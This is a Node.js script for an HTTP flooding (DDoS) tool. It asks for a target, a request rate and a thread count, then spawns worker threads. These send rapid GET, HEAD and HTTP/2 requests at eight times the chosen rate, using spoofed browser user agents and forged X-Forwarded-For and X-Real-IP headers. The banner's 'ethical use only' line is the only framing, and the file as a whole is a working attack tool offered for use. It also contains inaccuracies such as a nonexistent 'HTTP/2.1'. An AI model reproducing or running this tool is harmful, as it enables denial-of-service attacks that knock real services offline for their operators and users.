const { Worker, isMainThread, workerData } = require('worker_threads');
const http = require('http');
const https = require('https');
const axios = require('axios');
const http2 = require('http2');
const readline = require('readline');

// Function to simulate a rapid request (HTTP/1.1)
function rapidRequestHTTP1(url) {
  const options = {
    hostname: url,
    port: 80, // Assuming HTTP
    path: '/',
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'X-Requested-With': 'XMLHttpRequest',
      'Accept': 'application/json',
      'Connection': 'keep-alive',
    },
  };

  const req = http.request(options, () => {
    // No response handler
  });

  req.on('error', (e) => {
    console.error(`Request failed: ${e.message}`);
  });

  req.end();
}

// Function for sending HEAD requests (HULK HEAD) - HTTP/1.1
function hulkHeadRequestHTTP1(url) {
  const options = {
    hostname: url,
    port: 80, // Assuming HTTP
    path: '/',
    method: 'HEAD',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Connection': 'keep-alive',
    },
  };

  const req = http.request(options, () => {
    // No response handler
  });

  req.on('error', (e) => {
    console.error(`Request failed: ${e.message}`);
  });

  req.end();
}

// ADD function for HTTP/1.1 - to send custom requests with added headers
function addRequestHTTP1(url) {
  const options = {
    hostname: url,
    port: 80, // Assuming HTTP
    path: '/',
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'X-Forwarded-For': '123.45.67.89',
      'X-Real-IP': '123.45.67.89',
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'keep-alive',
    },
  };

  const req = http.request(options, () => {
    // No response handler
  });

  req.on('error', (e) => {
    console.error(`Request failed: ${e.message}`);
  });

  req.end();
}

// Function to make asynchronous requests using axios (HTTP/1.1)
async function newAsyncRequestHTTP1(url) {
  try {
    await axios.get(`http://${url}`);
    // No response handling
  } catch (error) {
    console.error(`Async HTTP/1.1 request error: ${error.message}`);
  }
}

// Function to simulate a HTTP/2.1 request (experimental)
function rapidRequestHTTP2(url) {
  const client = http2.connect(`http://${url}`);

  client.on('error', (err) => {
    console.error(`HTTP/2.1 connection error: ${err.message}`);
  });

  const req = client.request({
    ':method': 'GET',
    ':path': '/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  });

  req.end(); // No response handler
}

// Powerful Request Attack - 8x RPS (requests per second)
function powerfulRequestAttack(url, baseRps) {
  const attackRps = baseRps * 8; // 8x RPS
  setInterval(() => {
    rapidRequestHTTP1(url); // RAPID HTTP/1.1 Request
    hulkHeadRequestHTTP1(url); // HULK HEAD HTTP/1.1 Request
    addRequestHTTP1(url); // ADD HTTP/1.1 Request
    newAsyncRequestHTTP1(url); // Async HTTP/1.1 Request
    rapidRequestHTTP2(url); // RAPID HTTP/2.1 Request
  }, 1000 / attackRps); // 8x increased request frequency
}

// Banner function for displaying message
function showBanner() {
  console.log(`
    *****************************************************
    *              Powerful DDoS Tool for Testing      *
    *   Simulating RAPID, HULK HEAD, ADD Requests     *
    *   HTTP/1.1 and HTTP/2.1 Requests included       *
    *   Powerful 8x RPS Attack Mode!                  *
    *   Ethical use only, with proper authorization.  *
    *****************************************************
  `);
}

// Worker function to run in threads
function threadWorker(url, rps) {
  powerfulRequestAttack(url, rps); // Launch powerful attack with 8x RPS
}

// Main thread logic
if (isMainThread) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  showBanner(); // Display the banner message

  // Prompt the user for input
  rl.question('Enter the target URL: ', (targetURL) => {
    rl.question('Enter the number of requests per second (RPS): ', (rps) => {
      rl.question('Enter the number of threads: ', (numThreads) => {
        console.log(`Starting attack on ${targetURL} with ${numThreads} threads, each sending ${rps} requests per second...`);

        // Create worker threads
        for (let i = 0; i < numThreads; i++) {
          new Worker(__filename, {
            workerData: { url: targetURL, rps: parseInt(rps, 10) },
          });
        }

        rl.close();
      });
    });
  });
} else {
  // Worker thread execution
  const { url, rps } = workerData;
  threadWorker(url, rps);
}